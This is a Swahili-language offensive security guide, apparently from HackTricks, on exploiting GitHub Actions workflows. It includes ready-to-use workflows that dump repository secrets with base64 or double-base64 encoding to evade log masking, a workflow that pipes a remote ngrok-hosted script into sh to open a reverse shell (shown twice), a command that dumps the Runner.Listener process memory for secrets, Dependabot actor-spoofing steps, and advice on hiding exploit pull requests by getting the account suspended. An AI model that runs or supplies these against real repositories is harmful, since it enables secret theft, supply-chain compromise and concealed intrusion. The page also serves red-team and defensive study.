# Kutumia Vibaya Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Zana

Zana zifuatazo zinasaidia kutafuta Github Action workflows na hata kupata zile zilizo hatarishi:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Angalia pia checklist yake katika [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Taarifa za Msingi

Kwenye ukurasa huu utapata:

- Muhtasari wa **madhara yote** ya mshambuliaji kufanikiwa kupata ufikiaji wa Github Action
- Njia tofauti za **kupata ufikiaji wa action**:
- Kupewa **idhini** za kuunda action
- Kutumia vibaya vichocheo vinavyohusiana na **pull request**
- Kutumia vibaya **mbinu nyingine za ufikiaji wa nje**
- **Pivoting** kutoka repo iliyoshambuliwa tayari
- Mwisho, sehemu kuhusu **post-exploitation techniques za kutumia action kutoka ndani** (kusababisha madhara yaliyotajwa)

## Muhtasari wa Madhara

Kwa utangulizi kuhusu [**Github Actions angalia taarifa za msingi**](../basic-github-information.md#github-actions).

Ikiwa unaweza **execute arbitrary code in GitHub Actions** ndani ya **repository**, unaweza kuwa na uwezo wa:

- **Steal secrets** zilizowekwa kwenye pipeline na **abuse the pipeline's privileges** kupata ufikiaji usioidhinishwa kwa platforms za nje, kama AWS na GCP.
- **Compromise deployments** na **artifacts** nyingine.
- Ikiwa pipeline inafanya deploy au kuhifadhi assets, unaweza kubadilisha bidhaa ya mwisho, hivyo kuwezesha supply chain attack.
- **Execute code in custom workers** ili kutumia nguvu za kompyuta vibaya na **pivot** kwenda kwenye mifumo mingine.
- **Overwrite repository code**, kulingana na ruhusa zinazohusiana na `GITHUB_TOKEN`.

## GITHUB_TOKEN

Hii "**secret**" (inayotoka kwa `${{ secrets.GITHUB_TOKEN }}` na `${{ github.token }}`) hutolewa wakati admin anawasha chaguo hili:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Token hii ni ile ile itakayotumika na **Github Application**, hivyo inaweza kupata endpoints zile zile: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github inapaswa kutoa a [**flow**](https://github.com/github/roadmap/issues/74) ambayo **unaruhusu cross-repository** access ndani ya GitHub, hivyo repo inaweza kufikia repos nyingine za ndani kwa kutumia `GITHUB_TOKEN`.

Unaweza kuona **permissions** zinazowezekana za token hii katika: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Kumbuka kuwa token **huisha baada ya job kukamilika**.  
Tokens hizi zinaonekana hivi: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Baadhi ya mambo ya kuvutia unaweza kufanya na token hii:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Kumbuka kwamba katika nyakati kadhaa utaweza kupata **github user tokens inside Github Actions envs or in the secrets**. Tokens hizi zinaweza kukupa ruhusa zaidi kwenye repository na organization.

<details>

<summary>List secrets in Github Action output</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Pata reverse shell ukitumia secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Inawezekana kuangalia ruhusa zilizotolewa kwa Github Token katika repositories za watumiaji wengine **checking the logs** of the actions:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Utekelezaji Ulioruhusiwa

> [!NOTE]
> Hii ingekuwa njia rahisi zaidi ya compromise Github actions, kwani kesi hii inadhani kwamba una upatikanaji wa **create a new repo in the organization**, au una **write privileges over a repository**.
>
> Ikiwa uko katika hali hii unaweza tu angalia [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Utekelezaji kupitia Kuunda Repo

Ikiwa wanachama wa organization wanaweza **create new repos** na unaweza execute github actions, unaweza **create a new repo and steal the secrets set at organization level**.

### Utekelezaji kutoka kwenye Tawi Jipya

Ikiwa unaweza **create a new branch in a repository that already contains a Github Action** iliyosanidiwa, unaweza **modify** hiyo, **upload** yaliyomo, kisha **execute that action from the new branch**. Kwa njia hii unaweza **exfiltrate repository and organization level secrets** (lakini unahitaji kujua jinsi zinavyoitwa).

> [!WARNING]
> Kizuizi chochote kilichotekelezwa ndani tu ya workflow YAML (kwa mfano, `on: push: branches: [main]`, job conditionals, au manual gates) kinaweza kuhaririwa na collaborators. Bila utekelezaji wa nje (branch protections, protected environments, and protected tags), mchangiaji anaweza retarget workflow ili iendeshwe kwenye tawi lao na abuse mounted secrets/permissions.

Unaweza kufanya action iliyobadilishwa iwe executable **manually,** wakati **PR is created** au wakati **some code is pushed** (kutegemea jinsi unataka kuwa noisy):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Utekelezaji uliotokana na fork

> [!NOTE]
> Kuna trigger tofauti ambazo zinaweza kumruhusu mshambuliaji **execute a Github Action of another repository**. Ikiwa actions hizo zinazoweza kuchochewa zimewekwa vibaya, mshambuliaji anaweza kuwa na uwezo wa kuzijeruza.

### `pull_request`

Trigger ya workflow **`pull_request`** itaendesha workflow kila wakati pull request inapopokelewa, na baadhi ya ubaguzi: kwa default, ikiwa ni **mara ya kwanza** unafanya **kushirikiana**, baadhi ya **maintainer** watahitaji **kuidhinisha** **run** ya workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Kwa kuwa **kizuizi cha default** ni kwa **wachangiaji wa mara ya kwanza**, unaweza kuchangia kwa **kurekebisha bug/typo halali** kisha kutuma **PR nyingine ili kutumia vibaya haki zako mpya za `pull_request`**.
>
> **Nilijaribu hili na haliwezi kufanya kazi**: ~~Another option would be to create an account with the name of someone that contributed to the project and deleted his account.~~

Zaidi ya hayo, kwa default **inazuia ruhusa za kuandika** na **upatikanaji wa secrets** kwa repository lengwa kama ilivyoelezwa katika [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Mshambuliaji anaweza kubadilisha ufafanuzi wa Github Action ili kutekeleza vitu vilivyohitajika na kuongeza actions nyingine yoyote. Hata hivyo, mshambuliaji hatoweza kuiba secrets au kuandika juu ya repo kwa sababu ya vikwazo vilivyotajwa.

> [!CAUTION]
> **Ndio, ikiwa mshambuliaji atabadilisha katika PR github action itakayochochewa, Github Action yake ndiyo itakayotumiwa na si ile kutoka repo ya asili!**

Kwa kuwa mshambuliaji anadhibiti pia msimbo unaotekelezwa, hata kama hakuna secrets au ruhusa za kuandika kwenye `GITHUB_TOKEN`, mshambuliaji anaweza kwa mfano **kupakia artifacts zilizo na madhara**.

### **`pull_request_target`**

Trigger ya workflow **`pull_request_target`** ina **ruhusa za kuandika** kwa repository lengwa na **upatikanaji wa secrets** (na haitaji idhini).

Kumbuka kwamba trigger ya workflow **`pull_request_target`** **inaendesha katika base context** na si ile iliyopewa na PR (ili **kutoendesha code isiyoaminika**). Kwa maelezo zaidi kuhusu `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Zaidi ya hayo, kwa maelezo zaidi kuhusu matumizi hatari haya angalia hii [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Inaweza kuonekana kwa sababu **executed workflow** ni ile iliyoainishwa katika **base** na **si katika PR** ni **salama** kutumia **`pull_request_target`**, lakini kuna **matukio machache ambapo sio**.

Na hii itakuwa na **upatikanaji wa secrets**.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger inaruhusu kuendesha workflow kutoka kwa nyingine wakati ime `completed`, `requested` au `in_progress`.

Katika mfano huu, workflow imewekwa ili kuendesha baada ya workflow tofauti "Run Tests" kukamilika:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

Aina hii ya workflow inaweza kushambuliwa ikiwa ina **tegemezi** ya **workflow** inayoweza **kuzingishwa** na mtumiaji wa nje kupitia **`pull_request`** au **`pull_request_target`**. Mifano michache iliyo hatarini inaweza kupatikana katika [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Kwanza inahusisha workflow iliyozinduliwa na **`workflow_run`** kupakua code ya mshambuliaji: `${{ github.event.pull_request.head.sha }}`\
Pili inahusisha **kupitisha** **artifact** kutoka kwa code **isiyo ya kuaminika** hadi workflow ya **`workflow_run`** na kutumia yaliyomo katika artifact kwa njia inayofanya iwe **nyeti kwa RCE**.

### `workflow_call`

TODO

TODO: Angalia ikiwa wakati inatekelezwa kutoka kwa `pull_request` code inayotumika/ilipakuliwa ni ile kutoka repo ya asili au ile kutoka kwa PR iliyoforkiwa

## Kutumia Vibaya Utekelezaji wa Forked

Tumeelezea njia zote ambazo mshambuliaji wa nje anaweza kutumia kufanya github workflow itekelezwe; sasa tuchunguze jinsi utekelezaji huo, ukipangwa vibaya, unavyoweza kutumiwa vibaya:

### Untrusted checkout execution

Katika kesi ya **`pull_request`**, workflow itaendeshwa katika **context ya PR** (hivyo itatekeleza **code ya PR yenye madhara**), lakini mtu lazima **aiidhinishe kwanza** na itaendeshwa kwa baadhi ya [limitations](#pull_request).

Katika kesi ya workflow inayotumia **`pull_request_target` au `workflow_run`** ambayo inategemea workflow inayoweza kuzinduliwa kutoka **`pull_request_target` au `pull_request`**, code kutoka repo ya asili itatekelezwa, hivyo **mshambuliaji hawezi kudhibiti code itakayotekelezwa**.

> [!CAUTION]
> Hata hivyo, ikiwa **action** ina **explicit PR checkou**t ambayo ita**pata code kutoka PR** (na si kutoka base), itatumia code inayodhibitiwa na mshambuliaji. Kwa mfano (angalia mstari 12 ambapo code ya PR inapopakuliwa):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Code inayoweza kuwa **isiyo ya kuaminika inaendeshwa wakati wa `npm install` au `npm build`** kwani build scripts na referenced **packages zinadhibitiwa na mwandishi wa PR**.

> [!WARNING]
> Dork ya github kutafuta actions zilizo hatarini ni: `event.pull_request pull_request_target extension:yml` hata hivyo, kuna njia tofauti za kusanidi jobs ziendeshwe kwa usalama hata kama action imewekwa bila usalama (kama kutumia conditionals kuhusu ni nani actor anayetengeneza PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Kumbuka kuwa zipo baadhi ya [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) ambazo thamani zao zinadhibitiwa na **mtumiaji** anayefungua PR. Ikiwa github action inatumia data hiyo **kufanya chochote kutekelezwa**, inaweza kusababisha **utekelezaji wa code yoyote:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Kulingana na nyaraka: Unaweza kufanya environment variable ipatikane kwa hatua zozote zinazofuata katika job ya workflow kwa kuainisha au kusasisha environment variable na kuandika hili kwenye faili la mazingira **`GITHUB_ENV`**.

Ikiwa mshambuliaji anaweza **kuingiza thamani yoyote** ndani ya variable hii ya **env**, anaweza kuingiza env variables ambazo zinaweza kusababisha utekelezaji wa code katika hatua zinazofuata kama **LD_PRELOAD** au **NODE_OPTIONS**.

Kwa mfano ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), fikiria workflow inayomwamini artifact iliyopakiwa kuhifadhi yaliyomo ndani ya variable ya env **`GITHUB_ENV`**. Mshambuliaji anaweza kupakia kitu kama hiki ili kuiingilia:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Kama ilivyoonyeshwa katika [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), mashirika kadhaa zina Github Action inayochanganya merges za PR kutoka kwa `dependabot[bot]` kama ifuatavyo:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Hii ni tatizo kwa sababu uwanja wa `github.actor` unaonyesha user aliyesababisha tukio la mwisho lililochochea workflow. Na kuna njia kadhaa za kufanya mtumiaji `dependabot[bot]` abadilishe PR. Kwa mfano:

- Fork the victim repository
- Add the malicious payload to your copy
- Enable Dependabot on your fork adding an outdated dependency. Dependabot will create a branch fixing the dependency with malicious code.
- Open a Pull Request to the victim repository from that branch (the PR will be created by the user so nothing will happen yet)
- Then, attacker goes back to the initial PR Dependabot opened in his fork and runs `@dependabot recreate`
- Then, Dependabot perform some actions in that branch, that modified the PR over the victim repo, which makes `dependabot[bot]` the actor of the latest event that triggered the workflow (and therefore, the workflow runs).

Endelea, je ikiwa badala ya merging, Github Action ingekuwa na command injection kama ifuatavyo:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Kwenye blogpost ya awali ilipendekeza chaguzi mbili za kutumia tabia hii; hii ya pili ni:

- Fork repository ya mwathiriwa na wezesha Dependabot kwa dependency iliyochakaa.
- Unda branch mpya yenye malicious shell injection code.
- Badilisha default branch ya repo kuwa hiyo.
- Unda PR kutoka branch hii kwenda repository ya mwathiriwa.
- Endesha `@dependabot merge` kwenye PR ambayo Dependabot alifungua kwenye fork yake.
- Dependabot ata-merge mabadiliko yake kwenye default branch ya fork yako, ikiboresha PR kwenye repository ya mwathiriwa na kuifanya sasa `dependabot[bot]` kuwa actor wa tukio la mwisho lililochochea workflow na kutumia jina la branch lenye madhara.

### Github Actions za wahusika wa tatu zenye udhaifu

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Kama ilivyoelezwa katika [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), Github Action hii inaruhusu kufikia artifacts kutoka workflows tofauti na hata repositories.

Tatizo ni kwamba ikiwa parameter ya **`path`** haijawekwa, artifact inachomolewa katika current directory na inaweza kuandika juu ya faili ambazo zinaweza kutumika baadaye au hata kutekelezwa katika workflow. Kwa hiyo, ikiwa Artifact ina udhaifu, attacker anaweza kuitumia kuathiri workflows nyingine zinazoitegemea Artifact.

Mfano wa workflow iliyo na udhaifu:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Hii inaweza kushambuliwa kwa mtiririko huu wa kazi:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Ufikiaji wa Nje Nyingine

### Deleted Namespace Repo Hijacking

If an akaunti changes it's name another user could register an akaunti with that name after some time. If a repository had **less than 100 stars previously to the change of nam**e, Github will allow the new register user with the same name to create a **repository with the same name** as the one deleted.

> [!CAUTION]
> Hivyo ikiwa an action inatumia repo kutoka kwa akaunti isiyokuwepo, bado inawezekana kwamba an attacker anaweza kuunda akaunti hiyo na compromise the action.

If other repositories where using **dependencies from this user repos**, an attacker will be able to hijack them Here you have a more complete explanation: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> Katika sehemu hii tutazungumzia techniques ambazo zinaweza kuruhusu **pivot from one repo to another** tukizingatia kwamba tuna aina fulani ya access kwenye repo ya kwanza (angalia sehemu ya awali).

### Cache Poisoning

A cache is maintained between **wokflow runs in the same branch**. Which means that if an attacker **compromise** a **package** that is then stored in the cache and **downloaded** and executed by a **more privileged** workflow he will be able to **compromise** also that workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows could use **artifacts from other workflows and even repos**, if an attacker manages to **compromise** the Github Action that **uploads an artifact** that is later used by another workflow he could **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

As commented in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), even if a repository or organization has a policy restricting the use of certain actions, an attacker could just download (`git clone`) and action inside the workflow and then reference it as a local action. As the policies doesn't affect local paths, **the action will be executed without any restriction.**

Example:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Kupata AWS na GCP kupitia OIDC

Check the following pages:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Kupata secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Ikiwa unaingiza maudhui ndani ya script, ni muhimu kujua jinsi unavyoweza kupata secrets:

- Ikiwa secret au token imewekwa kama **environment variable**, inaweza kupatikana moja kwa moja kupitia environment kwa kutumia **`printenv`**.

<details>

<summary>Orodhesha secrets katika output ya Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Pata reverse shell with secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Ikiwa secret imetumika **directly in an expression**, script ya shell iliyotengenezwa imehifadhiwa **on-disk** na inapatikana.
- ```bash
cat /home/runner/work/_temp/*
```
- Kwa JavaScript actions, secrets hutumwa kupitia environment variables
- ```bash
ps axe | grep node
```
- Kwa **custom action**, hatari inaweza kutofautiana kulingana na jinsi program inavyotumia secret iliyoipata kutoka kwa **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Orodhesha secrets zote kupitia secrets context (collaborator level). Contributor mwenye write access anaweza kubadilisha workflow kwenye branch yoyote ili dump secrets zote za repository/org/environment. Tumia double base64 ili kuepuka GitHub’s log masking na udecode locally:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decode locally:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: kwa usiri wakati wa majaribio, encrypt kabla ya kuchapisha (openssl imewekwa awali kwenye GitHub-hosted runners).

### Kutumia vibaya Self-hosted runners

Jinsi ya kubaini ni GitHub Actions zipi zinaendeshwa katika non-github infrastructure ni kutafuta **`runs-on: self-hosted`** katika Github Action configuration yaml.

**Self-hosted** runners yanaweza kuwa na ufikiaji wa **extra sensitive information**, kwa **network systems** nyingine (vulnerable endpoints in the network? metadata service?) au, hata kama imepangwa kutengwa na kuharibiwa, **more than one action might be run at the same time** na ile mbaya inaweza **steal the secrets** za ile nyingine.

Katika self-hosted runners pia inawezekana kupata **secrets from the \_Runner.Listener**\_\*\* process\*\* ambayo itakuwa na secrets zote za workflows katika hatua yoyote kwa kudump memory yake:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Check [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Usajili wa Docker Images wa Github

Inawezekana kutengeneza Github actions ambazo zitakuwa **kujenga na kuhifadhi Docker image ndani ya Github**.\
Mfano unaweza kupatikana katika sehemu inayoweza kupanuliwa ifuatayo:

<details>

<summary>Github Action Kujenga na Kupakia Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kama ulivyoona katika msimbo uliopita, Github registry imehifadhiwa katika **`ghcr.io`**.

Mtumiaji mwenye ruhusa za kusoma kwenye repo ataweza kupakua Docker Image kwa kutumia personal access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Kisha, mtumiaji anaweza kutafuta **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Taarifa nyeti katika Github Actions logs

Hata kama **Github** inajaribu **detect secret values** katika logs za actions na **avoid showing** zao, **other sensitive data** ambazo zinaweza kuwa zimeundwa wakati wa utekelezaji wa action hazitafichwi. Kwa mfano JWT iliyosainiwa na secret value haitafichwi isipokuwa ika [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Kuficha alama zako

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Kwanza kabisa, PR yoyote iliyowasilishwa inaonekana wazi kwa umma kwenye Github na kwa akaunti lengwa ya GitHub. Kwa chaguo-msingi kwenye GitHub, hatuwezi kufuta PR kutoka kwenye internet, lakini kuna ujanja. Kwa akaunti za Github ambazo zime **suspended** na Github, PR zao zote zinafutwa kiotomatiki na kuondolewa kutoka kwenye internet. Hivyo, ili kuficha shughuli zako unahitaji ama kuifanya akaunti yako ya **GitHub account suspended or get your account flagged**. Hii itaficha shughuli zako zote kwenye GitHub kutoka kwenye internet (kimsingi kuondoa PR zako za exploit).

Shirika kwenye GitHub linachukua hatua kwa haraka kuripoti akaunti kwa GitHub. Unachohitaji kufanya ni kushiriki “some stuff” kwenye Issue na watahakikisha akaunti yako inasuspended ndani ya masaa 12 :p na hapo una, umefanya exploit yako isionekane kwenye github.

> [!WARNING]
> Njia pekee kwa shirika kugundua limewekwa lengo ni kuchunguza GitHub logs kutoka SIEM kwa sababu kutoka GitHub UI PR itafutwa.

## Marejeo

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
